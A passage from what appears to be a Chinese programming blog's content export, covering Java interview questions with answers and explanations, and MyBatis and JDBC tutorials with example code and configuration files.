MyApplication {    public static void main(String[] args) {        // TODO Auto-generated method stub        Test test=null;        test.hello();    }}</code></pre><ol><li>能编译通过，并正确运行</li><li>因为使用了未初始化的变量，所以不能编译通过</li><li>以错误的方式访问了静态方法</li><li>能编译通过，但因变量为null，不能正常运行</li></ol><p><strong>正确答案:A</strong></p><p>解析:</p><ol><li>因为Test类的hello方法是静态方法,静态方法是属于类的,当类被实例化的时候,静态方法只会被加载一次,所以不管new没new都不会被影响,只要使用了Test类hello方法就一定会被初始化.</li><li>在其他非静态类的静态方法中是可以调用静态类的静态方法的,所以这里在非静态类的MyApplication静态方法main中调用hello方法是可以的.</li></ol><h1 id="对于线程局部存储TLS-Thread-local-storage-，以下表述正确的是"><a href="#对于线程局部存储TLS-Thread-local-storage-，以下表述正确的是" class="headerlink" title="对于线程局部存储TLS(Thread local storage)，以下表述正确的是"></a>对于线程局部存储TLS(Thread local storage)，以下表述正确的是</h1><ol><li>解决多线程中的对同一变量的访问冲突的一种技术</li><li>TLS会为每一个线程维护一个和该线程绑定的变量的副本</li><li>每一个线程都拥有自己的变量副本，从而也就没有必要对该变量进行同步了</li><li>Java平台的java.lang.ThreadLocal是TLS技术的一种实现</li></ol><p><strong>正确答案:ABD</strong></p><p>解析:</p><p>C错误的原因,同一全局变量或者静态变量每个线程访问的是同一变量,每个线程同时访问同一变量或者静态变量时会导致冲突,当多个线程同时<strong>修改</strong>这一变量时,通过TLS机制,为每个使用该全局变量的线程都提供一个变量值的副本,每个线程都能够独立访问和改变自己的副本,而不会和其他的线程的副本产生冲突.</p><h1 id="不能用来修饰interface的有（-）（仅限外部接口）"><a href="#不能用来修饰interface的有（-）（仅限外部接口）" class="headerlink" title="不能用来修饰interface的有（ ）（仅限外部接口）"></a>不能用来修饰interface的有（ ）（仅限外部接口）</h1><ol><li>private</li><li>public</li><li>protected</li><li>static</li></ol><p><strong>正确答案:ACD</strong></p><p>解析:</p><p>接口是一种特殊的抽象类,接口中的方法全都是抽象方法,但是前面的abstract可以省略,所以抽象类中的抽象方法不能用的访问修饰符接口中也不能用,因为接口可以让所有的类去实现,不只是其子类,但是要用public去修饰,接口可以去继承一个已有的接口.</p><h1 id="在java中重写方法应遵循规则的包括（）"><a href="#在java中重写方法应遵循规则的包括（）" class="headerlink" title="在java中重写方法应遵循规则的包括（）"></a>在java中重写方法应遵循规则的包括（）</h1><ol><li>访问修饰符的限制一定要大于被重写方法的访问修饰符</li><li>可以有不同的访问修饰符</li><li>参数列表必须完全与被重写的方法相同</li><li>必须具有不同的参数列表</li></ol><p><strong>正确答案:BC</strong></p><p>解析:</p><p>方法重写遵循<strong>两同两小一大</strong>原则</p><ol><li>两同:方法名必须相同,参数列表必须相同.</li><li>两小:子类返回类型小于等于父类的方法返回类型.</li><li>子类抛出异常小于等于父类方法抛出异常.</li><li>子类访问权限大于等于父类方法访问权限</li></ol><p><strong>何为方法重写?</strong></p><p>重写是子类对父类的允许访问的方法的实现过程进行重新编写,返回值和形参都不能改变,即外壳不变,核心实现重写.</p><h1 id="给出以下代码"><a href="#给出以下代码" class="headerlink" title="给出以下代码"></a>给出以下代码</h1><p>第11行的哪个语句构造了一个内部类的实例？</p><pre><code>import EnclosingOne.InsideOneclass Enclosingone{    public class InsideOne {}}public class inertest{    public static void main(string[]args)    {        EnclosingOne eo = new EnclosingOne();        //insert code here第11行    }}</code></pre><ol><li>InsideOne ei=eo.new InsideOne();</li><li>eo.InsideOne ei=eo.new InsideOne();</li><li>InsideOne ei=EnclosingOne.new InsideOne();</li><li>EnclosingOne.InsideOne ei=eo.new InsideOne();  </li></ol><p><strong>正确答案:AD</strong></p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre><code>package demoTest;/*** @program: TestProject* @description:* @author: Mr.Wang* @create: 2019-06-10 13:09**/import demoTest.Enclosingone.InsideOneclass Enclosingone {    public class InsideOne {    }}public class Inertest {    public static void main(String[] args) {        Enclosingone eo = new Enclosingone();        //insert code here第11行        Enclosingone.InsideOne e = eo.new InsideOne();        InsideOne insideOne = eo.new InsideOne();    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java面试题 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>牛客网Java面试题(一)</title>
      <link href="/2019/06/09/niu-ke-wang-java-mian-shi-ti-yi/"/>
      <url>/2019/06/09/niu-ke-wang-java-mian-shi-ti-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="对接口的描述正确的是"><a href="#对接口的描述正确的是" class="headerlink" title="对接口的描述正确的是()"></a>对接口的描述正确的是()</h1><ol><li>一个类可以实现多个接口</li><li>接口可以有非静态的成员变量</li><li>在jdk8之前，接口可以实现方法</li><li>实现接口的任何类，都需要实现接口的方法</li></ol><p><strong>正确答案:A</strong></p><p>解析:</p><ol start="2"><li>接口中可以有静态方法和成员变量</li><li>JDK8之后,接口可以实现静态成员方法</li><li>抽象类实现某个接口，可以不实现所有接口的方法，可以由它的子类实现。而普通类即非抽象类则必须实现接口里的全部方法</li></ol><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre><code>public interface IDemo1 {    void printDemo1();    //Jdk8新特性    static void printDemo1Static() {        System.out.println(&quot;-------------Demo1Static方法被执行了-------------&quot;);    }}public interface IDemo2 {    void printDemo2();}public class ClassDemo implements IDemo1, IDemo2 {    @Override    @Test    public void printDemo1() {        //JDK8新特性之后接口中可以有静态方法,且静态方法有方法体        IDemo1.printDemo1Static();        System.out.println(&quot;张三&quot;);    }    @Test    @Override    public void printDemo2() {        System.out.println(&quot;李四&quot;);    }}</code></pre><h1 id="在Java中，无论在何处调用，使用静态属性必须以类名做前缀。"><a href="#在Java中，无论在何处调用，使用静态属性必须以类名做前缀。" class="headerlink" title="在Java中，无论在何处调用，使用静态属性必须以类名做前缀。"></a>在Java中，无论在何处调用，使用静态属性必须以类名做前缀。</h1><ol><li>正确</li><li>错误</li></ol><p><strong>正确答案:B</strong></p><p>解析:</p><p>在静态类中调用静态方法不需要使用类名作前缀</p><h2 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h2><pre><code>public class OuterClass {    //非静态属性    private String noStaticClassName = &quot;李四&quot;;    //静态属性    private static int noStaticClassAge = 12;    //静态内部类    public static class StaticInnerClass {        //静态属性        private static int age = 20;        //非静态属性        private String name = &quot;张三&quot;;        public void echo() {            //在静态类中使用静态属性不用使用类名点属性名            System.out.println(&quot;静态类中的成员属性age:&quot; + age);            System.out.println(&quot;静态类中的非静态属性name:&quot; + name);            System.out.println(&quot;非静态类中的静态成员属性noStaticClassAge:&quot; + noStaticClassAge);        }    }    public static void main(String[] args) {        //在非静态类中使用静态属性必须使用类名.属性名        System.out.println(StaticInnerClass.age);        //在非静态类中想要调用静态类中的非静态方法的话必须这样实例化        OuterClass.StaticInnerClass notStaticClass = new StaticInnerClass();        notStaticClass.echo();    }}</code></pre><h1 id="一般情况下，以下哪个选项不是关系数据模型与对象模型之间匹配关系？"><a href="#一般情况下，以下哪个选项不是关系数据模型与对象模型之间匹配关系？" class="headerlink" title="一般情况下，以下哪个选项不是关系数据模型与对象模型之间匹配关系？"></a>一般情况下，以下哪个选项不是关系数据模型与对象模型之间匹配关系？</h1><ol><li>表对应类</li><li>记录对应对象</li><li>表的字段对应类的属性</li><li>表之间的参考关系对应类之间的依赖关系</li></ol><p><strong>正确答案:D</strong></p><p>解析: 一般关系数据模型和对象数据模型之间有以下对应关系:表对应类,记录对应对象,表的字段对应类的属性.</p><h1 id="建立Statement对象的作用是？"><a href="#建立Statement对象的作用是？" class="headerlink" title="建立Statement对象的作用是？"></a>建立Statement对象的作用是？</h1><ol><li>连接数据库</li><li>声明数据库</li><li>执行SQL语句</li><li>保存查询结果</li></ol><p><strong>正确答案:C</strong></p><p>解析: </p><p>Statement对象:用于执行静态SQL语句并返回其生成的结果的对象。</p><p>Statement对象用于执行不带参数的简单SQL语句。 </p><p>Prepared Statement对象:用于执行预编译SQL语句。 </p><p>Callable Statement对象:用于执行对存储过程的调用</p><h2 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h2><h3 id="Statement对象"><a href="#Statement对象" class="headerlink" title="Statement对象"></a>Statement对象</h3><pre><code>package statementDemo;import java.sql.*;/*** @program: TestProject* @description: Statement对象可以正常的访问数据库, 适用于运行静态SQL语句, Statement接口不接受参数* @author: Mr.Wang* @create: 2019-06-09 19:13**/public class StatementClassDemo {    //数据库连接驱动    static final String jdbc_driver = &quot;com.mysql.cj.jdbc.Driver&quot;;    //数据库连接url    static final String jdbc_url = &quot;jdbc:mysql://localhost:3306/jd?serverTimezone=UTC&quot;;    //数据库账号    static final String username = &quot;root&quot;;    //数据库密码    static final String password = &quot;root&quot;;    public static void main(String[] args) {        Connection connection = null;        Statement statement = null;        try {            //通过反射获取类对象,作用是为了注册JDBC驱动            Class.forName(jdbc_driver);            //打开一个连接            System.out.println(&quot;开始连接数据库..........&quot;);            connection = DriverManager.getConnection(jdbc_url, username, password);            //执行查询            System.out.println(&quot;开始执行查询&quot;);            statement = connection.createStatement();            String sql = &quot;select * from computer&quot;;            ResultSet resultSet = statement.executeQuery(sql);            while (resultSet.next()) {                System.out.println(&quot;按列名进行检索&quot;);                String name = resultSet.getString(&quot;name&quot;);                String price = resultSet.getString(&quot;price&quot;);                String comment = resultSet.getString(&quot;comment&quot;);                String shop = resultSet.getString(&quot;shop&quot;);                System.out.println(&quot;-------------------输出值-------------------&quot;);                System.out.println(&quot;商品名:&quot; + name);                System.out.println(&quot;价格:&quot; + price);                System.out.println(&quot;评论数量:&quot; + comment);                System.out.println(&quot;店铺名字:&quot; + shop);            }            System.out.println(&quot;清理环境,释放资源&quot;);            System.out.println(&quot;关闭结果集&quot;);            resultSet.close();            System.out.println(&quot;关闭SQL声明对象&quot;);            statement.close();            System.out.println(&quot;关闭连接&quot;);            connection.close();        } catch (ClassNotFoundException c) {            c.printStackTrace();        } catch (SQLException sql) {            sql.printStackTrace();        } finally {            try {                if (statement != null) {                    statement.close();                }            } catch (SQLException e) {                e.printStackTrace();            }            try {                if (connection != null) {                    connection.close();                }            } catch (SQLException sql) {                sql.printStackTrace();            }        }        System.out.println(&quot;完毕&quot;);    }}</code></pre><h2 id="PreparedStatement"><a href="#PreparedStatement" class="headerlink" title="PreparedStatement"></a>PreparedStatement</h2><pre><code>package statementDemo;import java.sql.*;/*** @program: TestProject* @description: 计划多次使用SQL语句, PreparedStatement接口运行时接受输入参数* @author: Mr.Wang* @create: 2019-06-09 19:46**/public class PreparedStatementClassDemo {    //数据库连接驱动    static final String jdbc_driver = &quot;com.mysql.cj.jdbc.Driver&quot;;    //数据库连接url    static final String jdbc_url = &quot;jdbc:mysql://localhost:3306/jd?serverTimezone=UTC&quot;;    //数据库账号    static final String username = &quot;root&quot;;    //数据库密码    static final String password = &quot;root&quot;;    public static void main(String[] args) {        Connection connection = null;        PreparedStatement preparedStatement = null;        try {            //通过反射获取类对象,作用是为了注册JDBC驱动            Class.forName(jdbc_driver);            //打开一个连接            System.out.println(&quot;开始连接数据库..........&quot;);            connection = DriverManager.getConnection(jdbc_url, username, password);            //执行查询            System.out.println(&quot;开始执行查询&quot;);            String sql = &quot;select * from computer where name like ?&quot;;            preparedStatement = connection.prepareStatement(sql);            //将值绑定到参数            preparedStatement.setString(1, &quot;联想%&quot;);            ResultSet resultSet = preparedStatement.executeQuery();            while (resultSet.next()) {                System.out.println(&quot;按列名进行检索&quot;);                String name = resultSet.getString(&quot;name&quot;);                String price = resultSet.getString(&quot;price&quot;);                String comment = resultSet.getString(&quot;comment&quot;);                String shop = resultSet.getString(&quot;shop&quot;);                System.out.println(&quot;-------------------输出值-------------------&quot;);                System.out.println(&quot;商品名:&quot; + name);                System.out.println(&quot;价格:&quot; + price);                System.out.println(&quot;评论数量:&quot; + comment);                System.out.println(&quot;店铺名字:&quot; + shop);            }            System.out.println(&quot;清理环境,释放资源&quot;);            System.out.println(&quot;关闭结果集&quot;);            resultSet.close();            System.out.println(&quot;关闭SQL声明对象&quot;);            preparedStatement.close();            System.out.println(&quot;关闭连接&quot;);            connection.close();        } catch (ClassNotFoundException c) {            c.printStackTrace();        } catch (SQLException sql) {            sql.printStackTrace();        } finally {            try {                if (preparedStatement != null) {                    preparedStatement.close();                }            } catch (SQLException e) {                e.printStackTrace();            }            try {                if (connection != null) {                    connection.close();                }            } catch (SQLException sql) {                sql.printStackTrace();            }        }        System.out.println(&quot;完毕&quot;);    }}</code></pre><h1 id="下面有关SPRING的事务传播特性，说法错误的是？"><a href="#下面有关SPRING的事务传播特性，说法错误的是？" class="headerlink" title="下面有关SPRING的事务传播特性，说法错误的是？"></a>下面有关SPRING的事务传播特性，说法错误的是？</h1><ol><li>PROPAGATION_SUPPORTS：支持当前事务，如果当前没有事务，就以非事务方式执行</li><li>PROPAGATION_REQUIRED：支持当前事务，如果当前没有事务，就抛出异常</li><li>PROPAGATION_REQUIRES_NEW：新建事务，如果当前存在事务，把当前事务挂起</li><li>PROPAGATION_NESTED：支持当前事务，新增Savepoint点，与当前事务同步提交或回滚</li></ol><p><strong>正确答案:B</strong></p><p>解析:</p><ol><li>REQUIRED:如果当前没有事务，就新建一个事务，如果已经存在一个事务中，加入到这个事务中。一般的选<br>择（默认值）</li><li>SUPPORTS:支持当前事务，如果当前没有事务，就以非事务方式执行（没有事务） </li><li>MANDATORY：使用当前的事务，如果当前没有事务，就抛出异常 </li><li>REQUERS_NEW:新建事务，如果当前在事务中，把当前事务挂起。 </li><li>NOT_SUPPORTED:以非事务方式执行操作，如果当前存在事务，就把当前事务挂起 </li><li>NEVER:以非事务方式运行，如果当前存在事务，抛出异常 </li><li>NESTED:如果当前存在事务，则在嵌套事务内执行。如果当前没有事务，则执行REQUIRED 类似的操作。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java面试题 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Java最常见的面试题和解答</title>
      <link href="/2019/05/27/java-zui-chang-jian-de-mian-shi-ti-he-jie-da/"/>
      <url>/2019/05/27/java-zui-chang-jian-de-mian-shi-ti-he-jie-da/</url>
      
        <content type="html"><![CDATA[<ol><li>什么是JVM(Java虚拟机)</li></ol><p>JVM(Java Virtual Machine)是Java虚拟机.它是一个抽象的计算机或虚拟计算机,它运行已编译的java程序。实际上，JVM是一种软件实现，它位于真正的<strong>硬件平台和操作系统</strong>之上。它提供了编译的java程序与硬件和操作系统之间的抽象。因此<strong>编译后的程序不必担心他必须运行的硬件和操作系统，它全部由JVM处理，从而实现可移植性</strong>。所有Java程序都编译为字节码。<strong>JVM只能理解和执行Java字节码</strong>。我们可以将Java字节码理解为JVM的机器语言。Java编译器获取.java文件并将其编译为具有.class文件扩展名的字节码文件。编译器将一个Java源代码文件编译成一个class文件.</p><ol start="2"><li>什么是JIT(Just In Time)编译</li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>MyBatisSqlMapConfig.xml配置文件</title>
      <link href="/2019/05/16/mybatissqlmapconfig-xml-pei-zhi-wen-jian/"/>
      <url>/2019/05/16/mybatissqlmapconfig-xml-pei-zhi-wen-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="SqlMapConfig-xml中配置的内容和顺序"><a href="#SqlMapConfig-xml中配置的内容和顺序" class="headerlink" title="SqlMapConfig.xml中配置的内容和顺序"></a>SqlMapConfig.xml中配置的内容和顺序</h1><ul><li>properties(属性)<ul><li>property</li></ul></li><li>settings(全局配置参数)<ul><li>setting</li></ul></li><li>typeAliases(类型别名)<ul><li>typeAliases</li><li>package</li></ul></li><li>typeHandlers(类型处理器)</li><li>objectFactory(对象工厂)</li><li>plugins(插件)</li><li>enviroments(环境集合属性对象)<ul><li>enviroment(环境子属性对象)<ul><li>transactionManager(事务管理)</li><li>dataSoutce(数据源)</li></ul></li></ul></li><li>mappers(映射器)<ul><li>mapper</li><li>package</li></ul></li></ul><h2 id="properties-属性配置"><a href="#properties-属性配置" class="headerlink" title="properties(属性配置)"></a>properties(属性配置)</h2><p>resource属性:用于指定properties配置文件的位置,要求配置文件必须在类路径下.</p><pre><code>resource=&quot;jdbcConfig.properties&quot;</code></pre><p>url属性:</p><pre><code>url=file://配置文件的文件路径</code></pre><p>uri属性:</p><pre><code>http://example.org/absolute/URI/with/absolute/path/to/resource.txt</code></pre><h3 id="第一种使用方法"><a href="#第一种使用方法" class="headerlink" title="第一种使用方法"></a>第一种使用方法</h3><pre><code>&lt;properties&gt;&lt;!--配置连接数据库的基本信息--&gt;            &lt;property name=&quot;driver&quot; value=&quot;com.mysql.cj.jdbc.Driver&quot;/&gt;            &lt;property name=&quot;url&quot;                      value=&quot;jdbc:mysql://localhost:3306/chuanzhijava?useUnicode=true&amp;amp;characterEncoding=utf-8&amp;amp;useSSL=false&amp;amp;serverTimezone=UTC&quot;/&gt;            &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt;            &lt;property name=&quot;password&quot; value=&quot;LiuChen0.&quot;/&gt;&lt;/properties&gt;</code></pre><h3 id="第二种使用方法"><a href="#第二种使用方法" class="headerlink" title="第二种使用方法"></a>第二种使用方法</h3><p>在classPath下定义db.properties文件写入数据库连接用到的参数.</p><pre><code>jdbc.driver=com.mysql.jdbc.Driver jdbc.url=jdbc:mysql://localhost:3306/databasenamejdbc.username=root jdbc.password=1234</code></pre><h2 id="typeAliases-类型别名"><a href="#typeAliases-类型别名" class="headerlink" title="typeAliases(类型别名)"></a>typeAliases(类型别名)</h2><p>单个别名的定义方式</p><pre><code>&lt;typeAliases&gt;  &lt;typeAlias alias=&quot;user&quot; type=&quot;domain.User&quot;&gt;&lt;/typeAliases&gt;</code></pre><p>批量别名的定义方式</p><p>批量别名定义，扫描整个包下的类，别名为类名（首字母大写或小写都可以）</p><pre><code>&lt;typeAliases&gt;  &lt;package name=&quot;domain&quot;&gt;&lt;/typeAliases&gt;</code></pre><h2 id="mapper-映射器"><a href="#mapper-映射器" class="headerlink" title="mapper(映射器)"></a>mapper(映射器)</h2><p>第一种方式</p><pre><code>&lt;!--指定映射配置文件的位置,映射配置文件指的是每个DAO独立的配置文件--&gt;&lt;mappers&gt;    &lt;mapper resource=&quot;dao/UserDao.xml&quot;/&gt;&lt;/mappers&gt;</code></pre><p>第二种方式</p><pre><code>&lt;mappers&gt;    &lt;mapper class=&quot;dao.UserDao&quot;/&gt;&lt;/mappers&gt;</code></pre><p>此种方法要求mapper<strong>接口名称</strong>和<strong>mapper映射文件</strong>名称相同</p><p>第三种方式</p><pre><code>&lt;mappers&gt;    &lt;package name=&quot;dao&quot;/&gt;&lt;/mappers&gt;</code></pre><p>此种方法要求mapper<strong>接口名称</strong>和<strong>mapper映射文件</strong>名称相同</p>]]></content>
      
      
      <categories>
          
          <category> MyBatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MyBatis </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MyBatis的输出结果封装</title>
      <link href="/2019/05/16/mybatis-de-shu-chu-jie-guo-feng-zhuang/"/>
      <url>/2019/05/16/mybatis-de-shu-chu-jie-guo-feng-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="resultType配置结果类型"><a href="#resultType配置结果类型" class="headerlink" title="resultType配置结果类型"></a>resultType配置结果类型</h1><p>resultType是用来指定结果集的类型,它支持基本类型和实体类类型.和parameterType一样,如果注册了类型的别名,可以直接使用别名,没有注册过别名必须使用类的全限定名.同时当是实体类名称时,实体类中的属性必须和查询语句中的列名保持一致.</p><h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><h3 id="DAO层接口"><a href="#DAO层接口" class="headerlink" title="DAO层接口"></a>DAO层接口</h3><pre><code>//查询总用户数int findTotal();</code></pre><h3 id="映射文件配置"><a href="#映射文件配置" class="headerlink" title="映射文件配置"></a>映射文件配置</h3><pre><code>&lt;!--查询总用户数--&gt;&lt;select id=&quot;findTotal&quot; resultType=&quot;int&quot;&gt;    select count(id) from user;&lt;/select&gt;</code></pre><h3 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h3><pre><code>// 查询总用户数@Testpublic void testfindTotal() {    Integer count = userDao.findTotal();    System.out.println(count);}</code></pre><h2 id="实体类类型"><a href="#实体类类型" class="headerlink" title="实体类类型"></a>实体类类型</h2><h3 id="DAO层接口-1"><a href="#DAO层接口-1" class="headerlink" title="DAO层接口"></a>DAO层接口</h3><pre><code>/** * @Description: 查询所有用户 * @Param: [] * @return: java.util.List&lt;domain.User&gt; * @Author: Chen */List&lt;User&gt; findAll();</code></pre><h3 id="映射文件的配置"><a href="#映射文件的配置" class="headerlink" title="映射文件的配置"></a>映射文件的配置</h3><pre><code>&lt;!--查询所有--&gt;&lt;select id=&quot;findAll&quot; resultType=&quot;domain.User&quot;&gt;    select * from user;&lt;/select&gt;</code></pre><h3 id="测试方法-1"><a href="#测试方法-1" class="headerlink" title="测试方法"></a>测试方法</h3><pre><code>@Testpublic void testFindAll() {    //使用代理对象执行查询所有方法    List&lt;User&gt; users = userDao.findAll();    for (User user : users    ) {        System.out.println(user);    }}</code></pre><h2 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h2><p>当实体类名称和数据库列名不一样的时候是查不出数据的.如果遇到这种情况有两种解决方法:</p><ol><li>使用sql语句的as关键字给列名起别名.格式:<strong>列名 as 实体类属性名</strong></li><li>使用resultMap</li></ol><h1 id="resultMap结果类型"><a href="#resultMap结果类型" class="headerlink" title="resultMap结果类型"></a>resultMap结果类型</h1><p>resultMap标签可以建立查询的列名和实体类的属性名不一致时建立对应关系.从而实现封装.然后在select标签中使用resultMap属性指定引用即可.同时resultMap可以实现将查询结果映射为复杂类型的pojo,比如在查询结果映射对象中包括POJO和List实现一对一,一对多查询.</p><h2 id="实体类"><a href="#实体类" class="headerlink" title="实体类"></a>实体类</h2><pre><code>package domain;import java.util.Date;/*** @program: day2_1mybatisCRUD* @description: 实体类* @author: Mr.Wang* @create: 2019-05-07 23:02**/public class User {    //字段名字要和数据库中的字段名字一样    private Integer userId;    private String userUsername;    private Date userBirthday;    private String userSex;    private String userAddress;    public Integer getUserId() {        return userId;    }    public void setUserId(Integer userId) {        this.userId = userId;    }    public String getUserUsername() {        return userUsername;    }    public void setUserUsername(String userUsername) {        this.userUsername = userUsername;    }    public Date getUserBirthday() {        return userBirthday;    }    public void setUserBirthday(Date userBirthday) {        this.userBirthday = userBirthday;    }    public String getUserSex() {        return userSex;    }    public void setUserSex(String userSex) {        this.userSex = userSex;    }    public String getUserAddress() {        return userAddress;    }    public void setUserAddress(String userAddress) {        this.userAddress = userAddress;    }    @Override    public String toString() {        return &quot;User{&quot; +                &quot;userId=&quot; + userId +                &quot;, userUsername=&#39;&quot; + userUsername + &#39;\&#39;&#39; +                &quot;, userBirthday=&quot; + userBirthday +                &quot;, userSex=&#39;&quot; + userSex + &#39;\&#39;&#39; +                &quot;, userAddress=&#39;&quot; + userAddress + &#39;\&#39;&#39; +                &#39;}&#39;;    }}</code></pre><h2 id="数据库字段"><a href="#数据库字段" class="headerlink" title="数据库字段"></a>数据库字段</h2><pre><code>id    int(11)    NO    PRI        auto_incrementusername    varchar(32)    NO    &quot;&quot;        &quot;&quot;birthday    datetime    YES    &quot;&quot;        &quot;&quot;sex    char(1)    YES    &quot;&quot;        &quot;&quot;address    varchar(256)    YES    &quot;&quot;        &quot;&quot;</code></pre><h2 id="DAO层接口-2"><a href="#DAO层接口-2" class="headerlink" title="DAO层接口"></a>DAO层接口</h2><pre><code>List&lt;User&gt; findAll();</code></pre><h2 id="映射文件"><a href="#映射文件" class="headerlink" title="映射文件"></a>映射文件</h2><pre><code>&lt;resultMap id=&quot;userMap&quot; type=&quot;domain.User&quot;&gt;    &lt;id column=&quot;id&quot; property=&quot;userId&quot;/&gt;    &lt;result column=&quot;username&quot; property=&quot;userUsername&quot;/&gt;    &lt;result column=&quot;birthday&quot; property=&quot;userBirthday&quot;/&gt;    &lt;result column=&quot;sex&quot; property=&quot;userSex&quot;/&gt;    &lt;result column=&quot;address&quot; property=&quot;userAddress&quot;/&gt;&lt;/resultMap&gt;&lt;select id=&quot;findAll&quot; resultMap=&quot;userMap&quot;&gt;    select * from user;&lt;/select&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> MyBatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MyBatis </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MyBatis的参数深入</title>
      <link href="/2019/05/16/mybatis-de-can-shu-shen-ru/"/>
      <url>/2019/05/16/mybatis-de-can-shu-shen-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="parameterType配置参数"><a href="#parameterType配置参数" class="headerlink" title="parameterType配置参数"></a>parameterType配置参数</h1><p>给Sql语句传参数使用parameterType属性进行设置.该属性可以读取基本数据类型也可以读取引用类型,还可以是POJO类,同时也可以<strong>使用实体类的包装类</strong>.</p><p>注意:</p><p>基本数据类型和String在传参数的时候可以直接写类型名称,也可以使用包名,类名的方式.</p><p>例如:</p><p>  String–&gt;java.lang.String</p><p>为什么在传入参数的时候可以直接写类型的名称呢?因为MyBatis在加载时已经把常用的数据类型<strong>注册了别名</strong>,从而我们可以不用写包名,但是如果传入的参数是实体类的话,必须写实体类的全限定类名,因为我们的实体类名没有注册别名.</p><p><img src="https://s2.ax1x.com/2019/05/16/EHhXQO.png" alt="Mybatis内置别名"></p><h1 id="POJO"><a href="#POJO" class="headerlink" title="POJO"></a>POJO</h1><p>Plain Old Java Object普通旧Java对象（POJO）是一个普通的Java对象，不受任何特殊限制的约束,也不需要任何类路径.</p><p>POJO的含义:</p><p>有private的参数作为对象的属性,然后针对每一个参数定义get和set方法访问的接口。没有从任何类继承、也没有实现任何接口，更没有被其它框架侵入的java对象。</p><pre><code>public class QueryVo implements Serializable {    private User user;    public User getUser() {        return user;    }    public void setUser(User user) {        this.user = user;    }}</code></pre><h1 id="传递POJO包装对象"><a href="#传递POJO包装对象" class="headerlink" title="传递POJO包装对象"></a>传递POJO包装对象</h1><p>使用包装对象传递输入参数.</p><p>根据用户名查询用户信息,查询条件放到 QueryVo的 user属性中.</p><h2 id="POJO类"><a href="#POJO类" class="headerlink" title="POJO类"></a>POJO类</h2><pre><code>public class QueryVo implements Serializable {    private User user;    public User getUser() {        return user;    }    public void setUser(User user) {        this.user = user;    }}</code></pre><h2 id="编写持久层接口"><a href="#编写持久层接口" class="headerlink" title="编写持久层接口"></a>编写持久层接口</h2><pre><code>//根据QueryVO查询中的条件查询用户List&lt;User&gt; findUserByVo(QueryVo vo);</code></pre><h2 id="持久层映射文件的配置"><a href="#持久层映射文件的配置" class="headerlink" title="持久层映射文件的配置"></a>持久层映射文件的配置</h2><pre><code>&lt;!--根据QueryVO的条件查询用户#{user.username}:OGNL表达式    user:QueryVo中的属性,也就是User对象    username:user对象中的属性--&gt;&lt;select id=&quot;findUserByVo&quot; parameterType=&quot;domain.QueryVo&quot; resultType=&quot;domain.User&quot;&gt;    select * from user where username like #{user.username};&lt;/select&gt;</code></pre><h2 id="测试查询"><a href="#测试查询" class="headerlink" title="测试查询"></a>测试查询</h2><pre><code>//根据QueryVO查询中的条件查询用户@Testpublic void testFindByQueryVo() {    QueryVo queryVo = new QueryVo();    User user = new User();    user.setUsername(&quot;小%&quot;);    queryVo.setUser(user);    List&lt;User&gt; users = userDao.findUserByVo(queryVo);    for (User u :            users    ) {        System.out.println(u);    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> MyBatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MyBatis </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MyBatis基于代理DAO实现CRUD操作</title>
      <link href="/2019/05/16/mybatis-ji-yu-dai-li-dao-shi-xian-crud-cao-zuo/"/>
      <url>/2019/05/16/mybatis-ji-yu-dai-li-dao-shi-xian-crud-cao-zuo/</url>
      
        <content type="html"><![CDATA[<h1 id="搭建MyBatis环境"><a href="#搭建MyBatis环境" class="headerlink" title="搭建MyBatis环境"></a>搭建MyBatis环境</h1><ol><li>创建Maven工程</li><li>导入相关坐标<ul><li>MyBatis(3.4.5)</li><li>Junit(4.10)</li><li>log4j(1.2.12)</li><li>Mysql(8.0.15)</li></ul></li><li>编写必要的代码Dao和Domain</li><li>编写映射配置文件</li><li>配置SqlMapConfig.xml</li><li>编写测试类</li></ol><h1 id="基于代理DAO的方式实现CRUD"><a href="#基于代理DAO的方式实现CRUD" class="headerlink" title="基于代理DAO的方式实现CRUD"></a>基于代理DAO的方式实现CRUD</h1><p><strong>注意事项</strong>:</p><ol><li>DAO层接口和DAO层接口的配置文件必须在相同的包下.(<strong>IDEA需要特别注意</strong>)</li><li>持久层的mapper标签的namespace属性必须是DAO层接口的全限定类名</li><li>Sql语句的<strong>配置标签(select标签等)</strong>中的id属性必须和DAO层接口的方法名相同.</li></ol><h2 id="编写实体类"><a href="#编写实体类" class="headerlink" title="编写实体类"></a>编写实体类</h2><pre><code>package domain;import java.util.Date;public class User {    //字段名字要和数据库中的字段名字一样    private Integer id;    private String username;    private Date birthday;    private String sex;    private String address;    public void setId(Integer id) {        this.id = id;    }    public void setUsername(String username) {        this.username = username;    }    public void setBirthday(Date birthday) {        this.birthday = birthday;    }    public void setSex(String sex) {        this.sex = sex;    }    public void setAddress(String address) {        this.address = address;    }    public Integer getId() {        return id;    }    public String getUsername() {        return username;    }    public Date getBirthday() {        return birthday;    }    public String getSex() {        return sex;    }    public String 